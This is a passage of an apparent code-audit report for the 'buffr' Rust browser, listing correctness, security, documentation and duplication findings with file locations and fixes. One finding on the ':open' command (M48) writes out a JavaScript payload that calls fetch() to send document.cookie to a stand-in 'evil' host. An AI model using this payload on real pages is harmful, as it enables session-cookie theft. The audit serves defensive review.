  — every subsequent `draw_char` on any thread panics and the chrome can never
  repaint again.
- **Fix:** `lock().unwrap_or_else(|e| e.into_inner())`, or rasterize outside the
  lock and insert afterwards.
- **ACTIONABLE:** yes

### M29. `ConfirmPrompt` draws its message with no truncation

- **Category:** correctness
- **Location:** `crates/buffr-ui/src/confirm_prompt.rs:80`
- **Problem:** Unlike every other chrome widget, `paint_at` passes
  `&self.message` straight to `draw_text` with no width clamp. A message longer
  than the popup runs under and past the Yes/No buttons drawn immediately after
  (lines 91-92). Today's only message is fixed, but the struct is documented as
  the generic yes/no prompt for future callers.
- **Fix:** Route `message` through `truncate_to_width` bounded by
  `yes_x - text_x - pad`.
- **ACTIONABLE:** yes

### M30. Context-menu and pinned-close hit-testing use physical pixels against a logically-painted overlay

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:8018`,
  `apps/buffr-app/src/main.rs:7975`
- **Problem:** The context menu is painted from `cm.to_overlay(lwidth, lheight)`
  (lines 4177-4180) into the **logical** chrome buffer, but both hit-test sites
  build the overlay with **physical** dims and compare against physical cursor
  coords (8010-8019 for clicks, 7892-7898 for hover). At `scale = 2` the panel
  is drawn at logical `(x, y)` but tested at physical `(x, y)` — clicks on the
  visible menu miss entirely and fall into the "clicked outside → dismiss"
  branch. The pinned-close confirm buttons have the identical mismatch: the
  paint site (7134-7136) uses logical width, the hit-test uses
  `window.physical_size()`, so clicking "Yes" does nothing on any HiDPI scale.
- **Fix:** Compute the rects once in logical space in a shared helper used by
  both paint and hit-test, and convert the cursor to logical DIPs before
  testing.
- **ACTIONABLE:** yes

### M31. Popup window mixes logical strip height with physical buffer coordinates

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:6334`
- **Problem:** `paint_popup_window` calls `popup.renderer.resize(width, height)`
  with physical dims but never `set_logical_size`, so the popup chrome buffer is
  physical-sized. `bar_h = STATUSLINE_HEIGHT` is a logical constant yet is used
  as the OSR `dst_rect` y-offset (6334, 6357), the paint height (6338), and the
  cursor offset (6467-6470). At scale 2 the address bar renders half height and
  popup clicks land on the wrong DOM coordinates.
- **Fix:** Call `set_logical_size` for popup renderers and scale `bar_h` by the
  popup's `scale_factor()` where used against physical coordinates.
- **ACTIONABLE:** yes

### M32. `win_w - popup_w` underflows on narrow windows

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:7135` (also `:7192`, `:7976`)
- **Problem:** `popup_w` is `((win_w * 60) / 100).clamp(300, 800)`, so for
  `win_w < 300` the clamp forces `popup_w > win_w` and `win_w - popup_w`
  underflows — debug panics, release wraps to ~4.29e9 and the popup silently
  disappears. Reachable whenever the logical chrome width drops below the clamp
  floor (a 500 px window at scale 2 gives `lwidth = 250`).
- **Fix:** `.min(win_w)` after the clamp, or `saturating_sub`.
- **ACTIONABLE:** yes

### M33. `probe_pending` is never cleared on the early-return paths, defeating occlusion sleep

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:4241`
- **Problem:** `about_to_wait` sets `probe_pending = true` and clears
  `next_probe_at` (8658-8659). `probe_pending` is only reset at line 4476, after
  four early `return`s — notably the idle short-circuit at 4236-4242. If the
  probe redraw arrives before CEF produces a new frame, nothing has changed, the
  short-circuit fires, and `probe_pending` stays `true` forever with
  `next_probe_at == None`. The sleep guard at 4037-4042 is then permanently
  bypassed, so every chrome-dirty paint presents while occluded.
- **Fix:** Clear `probe_pending` on every exit path (a guard struct, or clear it
  immediately after reading it at the top).
- **ACTIONABLE:** yes

### M34. Skipped frames re-feed the previous frame's stats into the occlusion heuristic

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:4479`
- **Problem:** When `Renderer::frame` skips it returns
  `Ok(self.last_present_stats)` — the _previous_ frame's numbers — and
  `paint_chrome_with` feeds `stats.submit_done_us` into `observe_present_us`
  unconditionally, so one real sample is counted many times. (a) One 150 ms
  frame plus 2+ skips fills `present_us_history` with the same slow sample and
  trips the 3-of-5 rule at line 2947, falsely declaring occlusion. (b) While
  `Sleeping`, a skipped probe paint re-observes a stale _fast_ value with
  `was_probe = true` and takes the "probe fast → wake" branch at 2925 without
  ever having presented.
- **Fix:** Only call `observe_present_us` when the stats came from a frame
  actually submitted this call (same signal as H8).
- **ACTIONABLE:** yes

### M35. Config watcher reloads on every event in the config _directory_

- **Category:** correctness
- **Location:** `crates/buffr-config/src/watcher.rs:71`
- **Problem:** The watcher registers on `path.parent()` (correct, for
  atomic-rename saves) but the callback (lines 54-63) never compares
  `event.paths` against the target file. Any create/modify/remove anywhere in
  `~/.config/buffr/` — a sibling `keybinds.toml`, an editor swap file, `.git`
  churn — triggers a full reload + validate + user callback. If the config file
  happens to be absent at that moment the callback receives a spurious
  `ConfigError::Io`.
- **Fix:** Filter on `event.paths.iter().any(|p| p == &path)` in the closure.
- **ACTIONABLE:** yes

### M36. `SyncSender::send` on the UI thread can block the render loop indefinitely

- **Category:** correctness
- **Location:** `crates/buffr-core/src/inhibit/linux/wayland.rs:117`,
  `crates/buffr-core/src/inhibit/windows.rs:68`
- **Problem:** `acquire`/`release` call `SyncSender::send` on a
  `sync_channel(4)` from the winit event loop
  (`apps/buffr-app/src/main.rs:8620/8625`). If the worker wedges — e.g.
  `conn.flush()` at `wayland.rs:271` blocking on a full compositor socket — the
  four-slot buffer fills and the **browser UI thread** blocks forever inside
  `about_to_wait`. `Drop` (140-141) issues two more blocking sends and can hang
  shutdown the same way.
- **Fix:** Use `try_send` and treat `Full` as "drop this transition"; the apps
  layer re-evaluates policy every frame via `is_active()`, so it self-heals.
- **ACTIONABLE:** yes

### M37. Unmapped keys are injected into the editor as an `Insert` keypress

- **Category:** correctness
- **Location:** `crates/buffr-modal/src/edit_mode.rs:49`
- **Problem:** The catch-all arm of `key_event_to_planned` returns
  `PlannedInput::Key(SpecialKey::Insert, mods)`. The comment claims this is a
  "consumed no-op", but `Insert` is a real key the vim FSM acts on. Pressing any
  key crossterm models but this match doesn't (`KeyCode::Menu`, `Media(..)`,
  `F(13..)`, `Null`, modifier-only events) while editing a form field toggles
  insert/replace mode.
- **Fix:** Return a genuinely inert value — make `handle_key` return `false`, or
  map to a `PlannedInput` the FSM ignores. Do not reuse a live `SpecialKey`.
- **ACTIONABLE:** yes

### M38. winit adapter tests exercise a copy that has already diverged from production

- **Category:** correctness
- **Location:** `crates/buffr-modal/src/winit_adapter.rs:186`
- **Problem:** `translate_key_test_only` (186-218) is a hand-copy of
  `chord_from_logical` (69-125) that **omits both normalisation steps** — the
  SHIFT-drop for non-alphabetic ASCII glyphs (87-92) and the CTRL-lowercase fold
  (99-101). Every test runs through the copy, so the production path is
  untested; in particular the `<C-S-h>` regression the comment at 93-98 says was
  fixed has zero coverage.
- **Fix:** Delete `translate_key_test_only`, call `chord_from_logical` directly,
  and port the `shift_plus_drops_shift_modifier` /
  `ctrl_shift_h_normalizes_to_lowercase` cases over from `wayr_adapter`.
- **ACTIONABLE:** yes

### M39. `<C-c>` is bound twice; `StopLoading` is unreachable yet the a11y audit reports it covered

- **Category:** correctness
- **Location:** `crates/buffr-modal/src/keymap.rs:486`
- **Problem:** `DEFAULT_BINDINGS` maps `(Normal, "<C-c>", StopLoading)` at 486
  and `(Normal, "<C-c>", YankUrl)` at 508; `ModeMap::bind_chords` overwrites
  `node.action`, so last-write wins and `StopLoading` has no default binding at
  all. Worse, `missing_default_bindings` (line 205) builds its `bound` set by
  scanning the _table_, not the built trie, so `StopLoading` looks covered and
  `every_user_facing_action_has_a_default_binding` passes green.
  `docs/keymap.md:104` documents `<C-c>` as `StopLoading`.
- **Fix:** Pick one owner for `<C-c>`; change `missing_default_bindings` to walk
  the built `Keymap` so a shadowed row can't fake coverage; add a test asserting
  `DEFAULT_BINDINGS` has no duplicate `(mode, keys)` pair.
- **ACTIONABLE:** needs-decision

### M40. Bookmark omnibar search does a full table scan plus one query per row, per keystroke

- **Category:** correctness
- **Location:** `crates/buffr-bookmarks/src/lib.rs:375`
- **Problem:** `search()` calls `self.all()` (no `LIMIT`), and `all()` runs
  `load_tags(&conn, id)` inside its row loop (line 311) — one extra `SELECT` per
  bookmark — then filters in Rust. This is wired into the omnibar suggestion
  path (`apps/buffr-app/src/main.rs:4836`), recomputed on every keystroke, and
  only the first 8 results are used. With 2 000 bookmarks that's ~2 001 SQL
  round-trips per typed character. `by_tag` (line 351) has the same N+1.
- **Fix:** Push the match into SQL with a rank `CASE` and `LIMIT`; fetch tags
  with a single `WHERE bookmark_id IN (...)` join.
- **ACTIONABLE:** yes

### M41. Netscape import stores HTML-escaped URLs and titles verbatim

- **Category:** correctness
- **Location:** `crates/buffr-bookmarks/src/lib.rs:507`
- **Problem:** `href` is taken straight from the attribute with no entity
  decoding. Chrome/Firefox/Edge exports escape `&` as `&amp;`, so importing a
  real export of `https://example.com/?a=1&b=2` stores
  `https://example.com/?a=1&amp;b=2` — `url::Url::parse` accepts it, so the
  corruption is silent and the bookmark navigates to the wrong URL. Same for
  entities in titles via `strip_html` (line 586).
- **Fix:** Decode the five standard XML entities plus numeric references on both
  `href` and the label before calling `add`.
- **ACTIONABLE:** yes

### M42. Netscape import is non-atomic — one transaction per bookmark

- **Category:** correctness
- **Location:** `crates/buffr-bookmarks/src/lib.rs:537`
- **Problem:** The anchor loop calls `self.add(...)` per entry; each `add`
  re-acquires the mutex and opens/commits its own transaction (152-188). A 5 000
  bookmark export means 5 000 WAL commits, and any mid-import failure leaves the
  store half-imported with no rollback while `import_netscape` still returns
  `Ok(partial_count)`.
- **Fix:** Add a private `add_in_tx(&tx, ...)` and wrap the whole walk in one
  transaction.
- **ACTIONABLE:** yes

### M43. `which()` shells out to the `which` binary — non-portable, gates the whole MSI build

- **Category:** correctness
- **Location:** `xtask/src/main.rs:1546`
- **Problem:** `Command::new("which")` has no Windows equivalent (`where` is the
  builtin), so `package-windows-msi` on a Windows host without Git-for-Windows'
  `usr/bin` on `PATH` reports candle/light/heat as missing (line 1629) and
  silently returns `Ok(())` after only staging the payload — CI's "validate msi
  exists" step then fails with an unrelated message. `build_deb` re-implements
  the same shell-out inline at line 1149.
- **Fix:** Resolve tools by scanning `PATH` (plus `PATHEXT` on Windows) in Rust
  or use the `which` crate; delete the duplicate in `build_deb`.
- **ACTIONABLE:** yes

### M44. Integration tests hardcode `target/debug/buffr`

- **Category:** correctness
- **Location:** `apps/buffr/tests/clean_exit.rs:6` (and all eight test files)
- **Problem:** Every test builds the supervisor path by walking up from
  `CARGO_MANIFEST_DIR` and appending `target/debug/buffr`. Under
  `CARGO_TARGET_DIR`, `cargo test --release`, or a `--target <triple>` run, the
  path either doesn't exist (the `expect` panics) or points at a stale binary
  from a previous build — so the tests can silently pass against old code.
- **Fix:** Use `env!("CARGO_BIN_EXE_buffr")`.
- **ACTIONABLE:** yes

### M45. CI: `cargo-machete` pinned to a moving branch; no workflow-level `permissions`; SSH `accept-new`

- **Category:** security
- **Location:** `.github/workflows/ci.yml:439`, `:10`, `:1365`
- **Problem:** Three separate issues. (a) `bnjbvr/cargo-machete@main` resolves
  at run time, so a compromise of that repo executes arbitrary code in CI on the
  next push; every other action is at least tag-pinned. (b) Only
  `publish-github-release` declares `permissions:` (line 1205) — every other
  job, including the ones running third-party actions and
  `cargo install`/`choco install`, inherits the repository default
  `GITHUB_TOKEN` scope (`fuzz.yml:12` already does this correctly). (c) The SSH
  publish steps use `StrictHostKeyChecking=accept-new` against an always-empty
  `known_hosts` on an ephemeral runner — equivalent to `no`, so a MITM against
  `aur.archlinux.org` (1371) or `github.com` (1448, 1527) sees the
  deploy-key-authenticated session.
- **Fix:** Pin the action to a full commit SHA; add
  `permissions: contents: read` at the top of `ci.yml`; write known-good host
  keys into `~/.ssh/known_hosts` and use `StrictHostKeyChecking=yes`.
- **ACTIONABLE:** yes

### M46. Page-controlled console-sentinel parsers and the Netscape importer have no fuzz target

- **Category:** security
- **Location:** `fuzz/fuzz_targets/`, `crates/buffr-cef/src/handlers.rs:957`,
  `crates/buffr-bookmarks/src/lib.rs:446`
- **Problem:** The three console-sentinel parsers (see H5) are the most directly
  attacker-reachable parsers in the tree, and none is fuzzed. The Netscape
  importer is a hand-rolled regex walker (`(?is)<H3[^>]*>(.*?)</H3>` etc.) over
  a user-supplied file with lazy `.*?` over potentially large adversarial input,
  also unfuzzed. The three targets that _do_ exist (`parse_action`,
  `parse_keys`, `Config` TOML) all take input the user typed into their own
  config file.
- **Fix:** Add `buffr-core` and `buffr-bookmarks` to `fuzz/Cargo.toml`, plus a
  `fuzz_target_console_sentinel` driving all three parsers and a
  `fuzz_target_netscape_import`; register both in `.github/workflows/fuzz.yml`.
- **ACTIONABLE:** yes

### M47. `create_browser` indexes `tabs` under a re-acquired lock

- **Category:** correctness
- **Location:** `crates/buffr-cef/src/host.rs:1424`
- **Problem:** Lines 1413-1419 push the tab, compute `new_idx = tabs.len() - 1`,
  then `drop(tabs)`. Line 1423 re-locks and does `tabs[new_idx]` — a bare index
  on a length that may have changed. If another holder of the
  `Arc<dyn BrowserEngine>` closes a tab in that window this panics; with
  `panic = "unwind"` and no `catch_unwind` in `cef-rs`, the process aborts at
  the `extern "C"` boundary.
- **Fix:** Do the `was_hidden(1)` inside the same guard that pushed the tab, or
  use `tabs.get(new_idx)`.
- **ACTIONABLE:** yes

### M48. `:open` bypasses the scheme allow-list every other navigation path enforces

- **Category:** security
- **Location:** `apps/buffr-app/src/main.rs:5583`
- **Problem:** `Command::Open(url)` passes the raw string straight to
  `host.navigate(&url)`. Every sibling path filters: the omnibar goes through
  `buffr_config::resolve_input`, which explicitly excludes `javascript:`/`data:`
  "to prevent XSS via the omnibar"; IPC-forwarded URLs go through
  `is_safe_forward_url`; cross-engine nav goes through `DISALLOWED_NAV_SCHEMES`
  (`engine_router.rs:244`). `:open javascript:fetch('//evil/'+document.cookie)`
  executes in the current page's origin.
- **Fix:** Route `Command::Open` through `resolve_input`, or at minimum reject
  `DISALLOWED_NAV_SCHEMES`.
- **ACTIONABLE:** needs-decision (is `:open` intended as a privileged escape
  hatch?)

### M49. Dead config knobs: `startup.new_tab_url`, `startup.restore_session`, `theme.mode`, `updates.channel`

- **Category:** correctness
- **Location:** `apps/buffr-app/src/main.rs:3150`, `:1163`,
  `crates/buffr-config/src/lib.rs:187`, `crates/buffr-core/src/updates.rs`
- **Problem:** All four are parsed, documented as live, and never read. (a)
  `A::TabNew` does `let url = self.homepage.clone()`; `cfg.startup.new_tab_url`
  has zero readers outside the config crate, yet `config.example.toml:18-19` and
  `docs/config.md:46` document it as the URL `tab_new` uses. (b) The restore
  gate is `if cli.private || cli.no_restore || crash_loop_detected` —
  `config.startup.restore_session` is never consulted, so setting it to `false`
  still restores; `config.example.toml:15-16` excuses this as "Phase 5 work" but
  the session store has landed. (c) `ThemeMode` (auto/dark/light) is referenced
  only inside `buffr-config`; `build_palette` never reads it, yet
  `config.example.toml:38-39` says `auto` "follows the desktop's appearance
  hint". (d) `UpdateConfig::channel` is validated at `lib.rs:730-736` but
  `check_now` always hits `/releases/latest` regardless.
- **Fix:** Wire each one up, or delete the field along with its validation and
  its doc rows.
- **ACTIONABLE:** needs-decision

### M50. Config file path is documented wrong for macOS and Windows

- **Category:** docs
- **Location:** `docs/config.md:10`, `config.example.toml:1`
- **Problem:** The docs tell macOS users to use
  `~/Library/Application Support/buffr/config.toml` and Windows users
  `%APPDATA%\buffr\config.toml`, and claim resolution goes through
  `directories::ProjectDirs::from("sh","kryptic","buffr")`. The actual loader is
  `hjkl_config::config_path::<Config>()`
  (`crates/buffr-config/src/loader.rs:28-30`), documented in that file's own
  header as XDG-everywhere (`~/.config/buffr/config.toml` on all three
  platforms). `directories` isn't even a dependency of `buffr-config`. A
  macOS/Windows user who follows the docs writes a file that is never read.
- **Fix:** Correct `docs/config.md:10-17` and the `config.example.toml` header.
- **ACTIONABLE:** yes

### M51. Documented keybindings that don't exist, and defaults that don't match the code

- **Category:** docs
- **Location:** `docs/keymap.md:79`, `:148`, `:244`, `docs/accessibility.md:40`,
  `config.example.toml:8`
- **Problem:** Verified drift against `crates/buffr-modal/src/keymap.rs`:
  - `docs/keymap.md:79-81` documents `<C-w>c` → `TabClose`, `<C-w>n` →
    `DuplicateTab`, `<C-w>p` → `PinTab`. None exist — `keymap.rs:468` binds bare
    `<C-w>` → `TabClose` (with a comment saying it is deliberately a leaf),
    `keymap.rs:454` binds `<leader>p` → `PinTab`, and `DuplicateTab` is not a
    `PageAction` variant at all. `docs/accessibility.md:39` repeats all three.
  - `docs/keymap.md:148` says `=` is `ZoomReset`; `keymap.rs:514` binds it to
    `ZoomIn`. The table also omits `0` / `)` → `ZoomReset`
    (`keymap.rs:517-518`).
  - `docs/accessibility.md:40` says `H`/`L` are history back/forward;
    `keymap.rs:446-447` binds them to `TabPrev`/`TabNext`, and back/forward are
    `J`/`K` (`keymap.rs:475-476`). `docs/keymap.md` gets this right, so the two
    docs contradict each other — in the a11y doc a keyboard-only user reads
    first.
  - `docs/keymap.md:244` claims `p`/`P` are unmapped (bound to `PasteUrl` at
    458-459), `:256` claims `u` is unmapped (bound to `ReopenClosedTab` at 462),
    `:255` claims `<C-t>` has no default (bound to `TabNewRight` at 466).
  - Eight bindings appear in no doc: `<leader>p` → `PinTab`, `<C-S-t>` →
    `ReopenClosedTab`, `<C-w>` → `TabClose`, `<C-S-h>`/`<C-S-l>` →
    `MoveTabLeft`/`MoveTabRight`, `0`/`)` → `ZoomReset`, `<C-c>` → `YankUrl`,
    and the entire Visual-mode set (`y` / `<C-c>` → `YankSelection`, 536-537).
  - `General::default()` is `homepage: "buffr://new"`, `leader: " "`;
    `config.example.toml:8,12` and `docs/config.md:38-39` show
    `https://example.com` and `"\\"`, and `docs/keymap.md:4-5` asserts the
    leader is `\`.
- **Fix:** Correct each row against the code.
- **ACTIONABLE:** yes (except the leader/homepage default, which needs a
  decision on whether the code or the docs is the intended value)

### M52. `config.example.toml` and `docs/config.md` omit live config surfaces

- **Category:** docs
- **Location:** `config.example.toml:6`, `docs/config.md:32`
- **Problem:** `config.example.toml` claims to show every key with its default
  but is missing `general.show_favicons` (parsed at `lib.rs:87`, consumed at
  `crates/buffr-cef/src/host.rs:469`), the five `[theme]` signal colours
  (`lib.rs:178-186`, consumed at `apps/buffr-app/src/main.rs:123-127`), the
  whole `[idle_inhibit]` section, and the whole `[engines]` section including
  `instances`/`rules` (~100 lines of validation at `lib.rs:817-913`).
  `docs/config.md`'s schema section omits `[downloads]`, `[hint]`,
  `[crash_reporter]`, `[updates]`, `[accessibility]`, `[engines]` — all six are
  `Config` fields read at runtime — plus `theme.high_contrast` and
  `privacy.skip_schemes`. Its "CLI flags" table lists 4 of ~30 flags.
- **Fix:** Add the missing surfaces; either complete the CLI table or retitle
  it.
- **ACTIONABLE:** yes

### M53. `README.md` build instructions do not work

- **Category:** docs
- **Location:** `README.md:113`
- **Problem:** Four verified errors. (a) Lines 113-116 say bare `cargo run`
  works and to use `-p buffr-bin` to be explicit; `cargo run` errors with "could
  not determine which binary to run" (the root `Cargo.toml:32-35` comment says
  so explicitly) and `buffr-bin` is not a package in the workspace. (b) Line 55
  describes `buffr` as the main browser binary — it is the supervisor;
  `buffr-app` is the browser and is absent from the table. (c) Line 62
  attributes CEF integration to `buffr-core` — that's `buffr-cef`, which along
  with `buffr-engine` and `buffr-view-source` is missing from the table. (d)
  Line 17 says "`0.1.0` — first tagged release" against a workspace version of
  `0.14.6`.
- **Fix:** Correct the run instructions (or add `default-run`), both tables, and
  the status line.
- **ACTIONABLE:** yes

### M54. Five byte-identical schema migration runners

- **Category:** dry
- **Location:** `crates/buffr-history/src/schema.rs:75`
- **Problem:** `apply()` + `latest_version()` are duplicated verbatim across
  five crates, differing only in the error enum name:
  `buffr-history/src/schema.rs:75-112`, `buffr-bookmarks/src/schema.rs:38-75`,
  `buffr-downloads/src/schema.rs:44-81`, `buffr-zoom/src/schema.rs:29-66`,
  `buffr-permissions/src/schema.rs:31-68`. ~38 lines × 5. Any fix to the
  migration protocol — e.g. handling a version _ahead_ of `MIGRATIONS.len()`,
  which all five currently ignore — has to land five times.
- **Fix:** Extract a shared `apply(conn, &[&str])`; each crate maps the error
  into its own enum at the single call site.
- **ACTIONABLE:** yes

### M55. Four copies of `truncate_to_width`, one of which is the panicking variant

- **Category:** dry
- **Location:** `crates/buffr-ui/src/lib.rs:331`
- **Problem:** The same 20-line helper exists at `lib.rs:331-352` (already
  `pub(crate)`), `tab_strip.rs:404-424`, `download_notice.rs:135-155`, and
  `permissions_prompt.rs:141-161`. The last copy's doc even says "duplicated
  here to avoid a `pub(crate)` leak" — but `input_bar.rs:433` already calls
  `crate::truncate_to_width` directly, so the rationale doesn't hold. This
  divergence is exactly how H1 and M26 came to live in only some copies.
- **Fix:** Delete the three private copies; call `crate::truncate_to_width`.
- **ACTIONABLE:** yes

---

## Low

### L1. Repeated `lock tabs → read active → get host` prologue (19 sites)

- **Category:** dry
- **Location:** `crates/buffr-cef/src/host.rs:925`
- **Problem:** The exact five-line block is repeated in `osr_mouse_move`
  (925-935), `osr_mouse_click` (955-965), `osr_mouse_leave` (971-985),
  `osr_mouse_wheel` (1084-1093), `osr_key_event` (1100-1108), `osr_focus`
  (1114-1122), `notify_was_resized` (1148-1175), `force_repaint_active`
  (1541-1557), `osr_sleep` (1573-1588), `osr_invalidate_view` (1594-1609),
  `active_zoom_level` (710-723), and again in nine popup equivalents (788-918).
  This is why M15 is so easy to reintroduce.
- **Fix:**
  `fn with_active_host<R>(&self, f: impl FnOnce(cef::BrowserHost) -> R) -> Option<R>`
  and a popup variant; route all of the above through them.
- **ACTIONABLE:** yes

### L2. Nine copy-pasted media-control JS builders across two crates

- **Category:** dry
- **Location:** `crates/buffr-cef/src/host.rs:2794`,
  `crates/buffr-engine/src/media_js.rs:11`
- **Problem:** `media_play_pause` (2794-2807), `media_toggle_mute` (2810-2823),
  `media_toggle_loop` (2826-2839), `media_toggle_controls` (2842-2855) and
  `media_picture_in_picture` (2860-2879) are the same 12-line `elementFromPoint`
  walk with a one-line body swapped — and `buffr-engine/src/media_js.rs:11-73`
  has the same five again. Worse, the `host.rs` test module re-implements all
  five verbatim (3696-3770) rather than calling the production functions, so the
  tests at 3772-3837 assert against their own copies and would still pass if the
  real builders were deleted.
- **Fix:** One `fn media_op(x, y, body: &str) -> String`; rewrite the tests to
  exercise it.
- **ACTIONABLE:** yes

### L3. Four copy-pasted `run_edit_*` JS wrappers

- **Category:** dry
- **Location:** `crates/buffr-cef/src/host.rs:2387`
- **Problem:** `run_edit_apply` (2387), `run_edit_attach` (2397),
  `run_edit_focus` (2406), `run_edit_detach` (2503) each repeat
  `serde_json::to_string(field_id).unwrap_or_else(...)` followed by the same
  `format!` against `"buffr://edit"`.
- **Fix:** `fn call_edit_fn(&self, name: &str, args: &[String])`.
- **ACTIONABLE:** yes

### L4. Three copy-pasted console-sentinel parsers

- **Category:** dry
- **Location:** `crates/buffr-core/src/media_probe.rs:38`
- **Problem:** `hint::parse_console_event` (439-445),
  `edit::parse_console_event` (172-177), and `media_probe::parse` (38-45) are
  the same body three times, each with its own copy of the same comment. Adding
  the H5 nonce check means editing three sites.
- **Fix:** One generic
  `parse_sentinel<T: DeserializeOwned>(line: &str, sentinel: &str)`.
- **ACTIONABLE:** yes

### L5. Wayland and Windows idle-inhibitor backends are near-identical copies

- **Category:** dry
- **Location:** `crates/buffr-core/src/inhibit/windows.rs:39`
- **Problem:** Four blocks duplicated verbatim modulo the log string: the
  `InhibitCmd` enum (`windows.rs:39-43` / `wayland.rs:45-49`), the `Debug` impl
  (55-61 / 104-110), the whole `IdleInhibitor` impl (63-85 / 112-134), and the
  20-line `Drop` (87-107 / 136-156). The M36 fix would otherwise land twice.
- **Fix:** Extract a shared `WorkerInhibitor` in `inhibit/mod.rs`; each backend
  supplies only its `run_worker`.
- **ACTIONABLE:** yes

### L6. Unix and Windows supervisor loops are near-verbatim duplicates

- **Category:** dry
- **Location:** `apps/buffr/src/main.rs:586`
- **Problem:** `wait_for_connect` (unix 586-617 / windows 1365-1393),
  `watch_heartbeat` (621-683 / 1395-1445) and the crash-window/backoff
  bookkeeping (434-477 / 1034-1076) are the same logic with a different "is the
  child alive" primitive. This is exactly why M2 and M3 exist on only one side.
- **Fix:**
  `trait ChildHandle { fn poll_exit(&mut self) -> Option<ExitInfo>; fn kill(&mut self); }`
  with a unix and a windows impl; make the three functions generic over it.
- **ACTIONABLE:** yes

### L7. `supervisor_bin()` copy-pasted into eight test files; one whole file is a duplicate

- **Category:** dry
- **Location:** `apps/buffr/tests/clean_exit_windows.rs:6`
- **Problem:** Identical `supervisor_bin()` bodies at `clean_exit.rs:6`,
  `clean_exit_windows.rs:6`, `heartbeat_alive.rs:10`,
  `heartbeat_disabled.rs:13`, `heartbeat_hang.rs:16`,
  `heartbeat_no_connect.rs:12`, `restart_on_crash.rs:9`,
  `restart_on_crash_windows.rs:9`; identical `crasher_script()` at
  `restart_on_crash.rs:23` and `heartbeat_disabled.rs:74`; and
  `clean_exit_windows.rs`'s only test is byte-for-byte the same scenario as
  `restart_on_crash_windows.rs:56`.
- **Fix:** Move helpers into `apps/buffr/tests/common/mod.rs`; delete
  `clean_exit_windows.rs`.
- **ACTIONABLE:** yes

### L8. Four identical `paint_chrome_strips` call sites

- **Category:** dry
- **Location:** `apps/buffr-app/src/main.rs:4289`
- **Problem:** The `PaintPath` match arms each inline a byte-identical
  13-argument `paint_chrome_strips(...)` call: 4289-4315 (plus the anim
  overlay), 4333-4347, 4377-4391, 4402-4416. Adding a chrome layer means editing
  four sites.
- **Fix:** Build one closure before the match and pass it to each arm; the
  Animation arm wraps it and appends the splash blit.
- **ACTIONABLE:** yes

### L9. Heartbeat + shutdown-flag preamble copy-pasted across four event hooks

- **Category:** dry
- **Location:** `apps/buffr-app/src/main.rs:7310`
- **Problem:** The
  `shutdown_flag → save_session_now → mark_clean_shutdown → exit` block appears
  verbatim at 7310-7315, 7620-7625, 8549-8554; the
  `heartbeat.mark_alive()/is_alive()` block at 7316-7321, 7626-7631, 8540-8545,
  9256-9261.
- **Fix:** Extract `fn tick_heartbeat(&mut self)` and
  `fn check_shutdown(&mut self, …) -> bool` on `AppState`.
- **ACTIONABLE:** yes

### L10. Five copies of the sqlite store open/tune boilerplate and its helpers

- **Category:** dry
- **Location:** `crates/buffr-bookmarks/src/lib.rs:96`
- **Problem:** `open()` + `open_in_memory()` + `tune()` are the same ~35 lines
  in `buffr-bookmarks:96-130`, `buffr-downloads:144-178`, `buffr-zoom:77-110`,
  `buffr-permissions:212-244`, `buffr-history:227-297` — identical `OpenFlags`,
  identical three `pragma_update` calls. Same for `ts_to_dt`
  (`buffr-history:512`, `buffr-bookmarks:559`, `buffr-downloads:410`) and
  `current_unix_time` (`buffr-zoom:201`, `buffr-permissions:347`).
- **Fix:** Same shared-crate extraction as M54: one `open_tuned(path)`, one
  `ts_to_dt`, one `current_unix_time`.
- **ACTIONABLE:** yes

### L11. Three identical popup/permission drain helpers

- **Category:** dry
- **Location:** `crates/buffr-engine/src/popup.rs:50`
- **Problem:** `drain_popup_urls` (50-55), `drain_popup_creates` (58-63),
  `drain_popup_closes` (66-71) are the same five lines, differing only in
  element type; the shape repeats again in `permissions.rs:108-113`.
- **Fix:** One generic `drain<T>(q: &Arc<Mutex<VecDeque<T>>>) -> Vec<T>`.
- **ACTIONABLE:** yes

### L12. `bridge_adapter` is a near-verbatim fork of `wayr_adapter`

- **Category:** dry
- **Location:** `crates/buffr-modal/src/bridge_adapter.rs:111`
- **Problem:** `chord_from_event` (111-178) duplicates `wayr_adapter.rs:60-119`,
  `modifiers_to_internal` (180-195) duplicates 121-136, and `map_named`
  (197-228) is a 32-line character-for-character copy of 141-172. The
  `wayr_adapter.rs:182-228` test seam is a _third_ copy. They have already begun
  to drift — only the bridge copy has the single-printable-codepoint fallback
  and the space alias — and the bridge copy has no tests.
- **Fix:** Extract one private helper taking
  `(text: Option<&str>, named: Option<&str>, mods: Modifiers)`; have all three
  call it.
- **ACTIONABLE:** yes

### L13. Duplicated `html_escape` implementations with different escape sets

- **Category:** dry
- **Location:** `crates/buffr-cef/src/new_tab.rs:94`
- **Problem:** `new_tab.rs:94` escapes only `& < >`; `view_source_scheme.rs:322`
  escapes `& < > " '`. Two functions with the same name and different security
  properties invite the wrong one being reused in an attribute context.
- **Fix:** Keep the stricter version in a shared module; delete the other along
  with its only (already dead) caller.
- **ACTIONABLE:** yes

### L14. `list_crashes` and `purge_older_than` duplicate the read-dir/parse loop

- **Category:** dry
- **Location:** `crates/buffr-core/src/crash.rs:163`
- **Problem:** Lines 133-154 and 169-191 both do
  `read_dir → flatten → extension == "json" → fs::read → from_slice → warn-skip`.
- **Fix:** Extract `fn read_reports(dir: &Path) -> Vec<(PathBuf, CrashReport)>`.
- **ACTIONABLE:** yes

### L15. Ten crates re-declare workspace dependency versions; one has already drifted

- **Category:** dry
- **Location:** `crates/buffr-webkit/Cargo.toml:23`
- **Problem:** `[workspace.dependencies]` declares `cef`, `chrono`, `notify`,
  `regex`, `rusqlite`, `semver`, `toml` — and not one member uses
  `.workspace = true` for any of them
  (`rusqlite = { version = "0.39", features = ["bundled"] }` appears in five
  manifests). This has already produced a live divergence: `buffr-webkit` pins
  `hjkl-clipboard = "0.5"` while the workspace uses `"0.25"` — incompatible
  under 0.x semver, so a standalone build of that crate resolves a different
  clipboard API than the shipped browser.
- **Fix:** Convert the literals to `.workspace = true`; bump `buffr-webkit`'s
  `hjkl-clipboard` to `0.25`.
- **ACTIONABLE:** yes

### L16. Dead legacy CEF permissions queue threaded through ten signatures

- **Category:** yagni
- **Location:** `crates/buffr-cef/src/permissions.rs:264`
